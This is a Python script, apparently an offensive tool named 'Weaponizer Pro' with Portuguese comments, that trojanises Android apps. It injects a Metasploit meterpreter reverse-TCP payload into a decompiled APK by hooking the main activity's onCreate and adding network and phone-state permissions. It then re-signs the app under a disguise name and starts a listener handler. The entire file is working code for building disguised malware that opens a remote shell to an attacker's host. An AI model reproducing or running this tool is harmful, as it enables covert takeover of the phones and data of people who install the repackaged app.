#!/usr/bin/env python3
import subprocess
import re
import os
import sys
import time
from shutil import which, copytree, rmtree

# --- PALETA DE CORES PROFISSIONAL ---
RED, DARK_RED, WHITE, BOLD, RESET, YELLOW, GREEN = "\33[91m", "\33[31m", "\33[97m", "\33[1m", "\33[0m", "\33[93m", "\33[92m"

def log(msg, level="info"):
    p = {"info": f"{WHITE}[*]{RESET}", "success": f"{GREEN}[+]{RESET}", "warn": f"{YELLOW}[!]{RESET}", "error": f"{BOLD}{RED}[-]{RESET}"}
    print(f"{p.get(level, '[*]')} {msg}")

def exibir_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = fr"""
{RED} ██╗    ██╗███████╗ █████╗ ██████╗  ██████╗ ███╗   ██╗██╗███████╗███████╗██████╗ 
{RED} ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔═══██╗████╗  ██║██║╚══███╔╝██╔════╝██╔══██╗
{DARK_RED} ██║ █╗ ██║█████╗  ███████║██████╔╝██║   ██║██╔██╗ ██║██║  ███╔╝ █████╗  ██████╔╝
{DARK_RED} ██║███╗██║██╔══╝  ██╔══██║██╔═══╝ ██║   ██║██║╚██╗██║██║ ███╔╝  ██╔══╝  ██╔══██╗
{RED} ╚███╔███╔╝███████╗██║  ██║██║     ╚██████╔╝██║ ╚████║██║███████╗███████╗██║  ██║
{RED}  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
{RESET}
 {WHITE}{BOLD}WEAPONIZER PRO{RESET} | {WHITE}Professional Red Team Engine{RESET}
 {DARK_RED}─────────────────────────────────────────────────────────────────────────────{RESET}
    """.strip()
    print(banner)

def check_dependencies():
    """Valida se o ambiente possui as ferramentas necessárias."""
    for tool in ["java", "apktool", "msfvenom", "apksigner", "keytool"]:
        if not which(tool):
            log(f"Ferramenta vital não encontrada: {tool}", "error")
            return False
    return True

def fix_manifest_and_permissions(folder):
    """Garante que o manifesto tenha as permissões de rede necessárias."""
    manifest_path = os.path.join(folder, "AndroidManifest.xml")
    if not os.path.exists(manifest_path): return False
    
    with open(manifest_path, "r") as f: content = f.read()
    
    # Lista de permissões críticas para o Shell Reverso
    perms = [
        'android.permission.INTERNET',
        'android.permission.ACCESS_NETWORK_STATE',
        'android.permission.WAKE_LOCK',
        'android.permission.READ_PHONE_STATE'
    ]
    
    added = 0
    for p in perms:
        if p not in content:
            content = content.replace("</manifest>", f'    <uses-permission android:name="{p}"/>\n</manifest>')
            added += 1
    
    if added > 0:
        with open(manifest_path, "w") as f: f.write(content)
        log(f"Injetadas {added} permissões de persistência no Manifesto.", "success")
    return True

def gerar_e_injetar_payload(project_folder):
    lhost = input(f" {YELLOW}»{RESET} LHOST (IP/DNS): ").strip()
    lport = input(f" {YELLOW}»{RESET} LPORT: ").strip()
    if not lhost or not lport: return False, None, None

    # Geração do Payload via MSFVenom
    log("Iniciando motor MSFVenom...", "info")
    p_apk = "payload_temp.apk"
    res = subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-o", p_apk], capture_output=True, text=True)
    if not os.path.exists(p_apk):
        log("Erro ao gerar payload com msfvenom!", "error"); print(res.stderr); return False, None, None

    log("Decompilando payload e migrando classes...", "info")
    subprocess.run(["apktool", "d", p_apk, "-o", "p_tmp", "-f"], capture_output=True)
    
    src = os.path.join("p_tmp", "smali", "com", "metasploit")
    dst = os.path.join(project_folder, "smali", "com", "metasploit")
    if os.path.exists(dst): rmtree(dst)
    copytree(src, dst)

    # Lógica de Hook
    with open(os.path.join(project_folder, "AndroidManifest.xml"), "r") as f:
        m = f.read()
        main_act = re.search(r'<activity [^>]*android:name="([^"]+)"', m).group(1)
        if main_act.startswith('.'):
            pkg = re.search(r'package="([^"]+)"', m).group(1)
            main_act = pkg + main_act

    rel_path = main_act.replace('.', '/') + ".smali"
    smali_path = None
    for i in range(1, 20):
        f_name = "smali" if i == 1 else f"smali_classes{i}"
        test_path = os.path.join(project_folder, f_name, rel_path)
        if os.path.exists(test_path):
            smali_path = test_path; break

    if not smali_path:
        log("MainActivity não encontrada nas classes Smali!", "error"); return False, None, None

    log(f"Injetando hook na classe: {os.path.basename(smali_path)}", "success")
    with open(smali_path, "r") as f: lines = f.readlines()
    
    new_lines, injected, in_oncreate = [], False, False
    for line in lines:
        new_lines.append(line)
        if ".method" in line and "onCreate(Landroid/os/Bundle;)V" in line: in_oncreate = True
        if in_oncreate and "invoke-super" in line and not injected:
            new_lines.append("\n    # --- WEAPONIZER HOOK ---\n")
            new_lines.append("    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V\n")
            injected = True
        if ".end method" in line: in_oncreate = False

    with open(smali_path, "w") as f: f.writelines(new_lines)
    
    # Corrige Permissões
    fix_manifest_and_permissions(project_folder)
    
    # Clean-up
    rmtree("p_tmp"); os.remove(p_apk)
    return True, lhost, lport

def build_e_assinar(out):
    """Processo de Recompilação e Assinatura com validação de saída."""
    print(f"\n {YELLOW}»{RESET} Nome desejado para o APK (Ex: zarchiver_mod):")
    name = input(f" {RED}# {RESET}").strip()
    if not name: name = f"{out}_weaponized"
    if not name.endswith(".apk"): name += ".apk"
    
    final_path = os.path.abspath(name)
    log(f"Construindo APK: {BOLD}{name}{RESET}...", "info")
    
    # 1. Build
    res_b = subprocess.run(["apktool", "b", out, "-o", "tmp_build.apk"], capture_output=True, text=True)
    if not os.path.exists("tmp_build.apk"):
        log("Erro crítico na recompilação!", "error")
        print(f"{RED}--- LOG TÉCNICO ---{RESET}\n{res_b.stderr}")
        input(f"\n{YELLOW}Pressione Enter para ver o erro e voltar ao menu...{RESET}")
        return False

    # 2. Keystore
    if not os.path.exists("weaponizer.keystore"):
        log("Gerando nova Keystore de segurança...", "info")
        subprocess.run(["keytool", "-genkey", "-v", "-keystore", "weaponizer.keystore", "-alias", "dev", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-storepass", "android", "-keypass", "android", "-dname", "CN=Weaponizer"], capture_output=True)

    # 3. Sign
    log("Assinando artefato final...", "info")
    res_s = subprocess.run(["apksigner", "sign", "--ks", "weaponizer.keystore", "--ks-pass", "pass:android", "--out", final_path, "tmp_build.apk"], capture_output=True, text=True)
    
    if os.path.exists("tmp_build.apk"): os.remove("tmp_build.apk")
    
    if os.path.exists(final_path):
        print(f"\n{GREEN}[+++] WEAPONIZATION CONCLUÍDA!{RESET}")
        print(f" {WHITE}Arquivo:{RESET} {BOLD}{final_path}{RESET}")
        input(f"\n{YELLOW}Pressione Enter para prosseguir...{RESET}")
        return True
    else:
        log("Falha na assinatura do APK!", "error")
        print(res_s.stderr)
        input("\nEntrar...")
        return False

def main():
    if not check_dependencies(): return
    while True:
        exibir_banner()
        print(f" [{RED}1{RESET}] Decompile APK\n [{RED}2{RESET}] GERAR SHELL + BUILD + SIGN\n [{RED}3{RESET}] Listar (ls)\n [{RED}4{RESET}] Sair")
        cmd = input(f"\n {BOLD}{RED}WEAPONIZER@terminal:~# {RESET}").strip()
        
        if cmd == "3" or cmd.lower() == "ls":
            print(f"\n{BOLD}Diretório atual: {os.getcwd()}{RESET}")
            subprocess.run(["ls", "-F", "--color=auto"]); input("\nEnter...")
        elif cmd == "1":
            file = input(f" {RED}»{RESET} APK Alvo: ").strip()
            if os.path.exists(file):
                out = os.path.splitext(os.path.basename(file))[0]
                log(f"Descompilando {file}...", "info")
                subprocess.run(["apktool", "d", file, "-o", out, "-f"], capture_output=True)
                log(f"Projeto pronto na pasta: {out}", "success"); time.sleep(2)
            else: log("Arquivo não encontrado.", "error"); time.sleep(1)
        elif cmd == "2":
            out = input(f" {RED}»{RESET} Nome da Pasta do Projeto: ").strip().rstrip('/')
            if os.path.isdir(out):
                success, ip, port = gerar_e_injetar_payload(out)
                if success:
                    if build_e_assinar(out):
                        if input(f"\n{YELLOW}[?]{RESET} Iniciar Handler agora? (s/n): ").lower() == 's':
                            os.system(f"msfconsole -q -x 'use multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {port}; exploit'")
            else: log(f"A pasta '{out}' não existe.", "error"); time.sleep(1)
        elif cmd == "4" or cmd.lower() == "exit": break

if __name__ == "__main__":
    main()
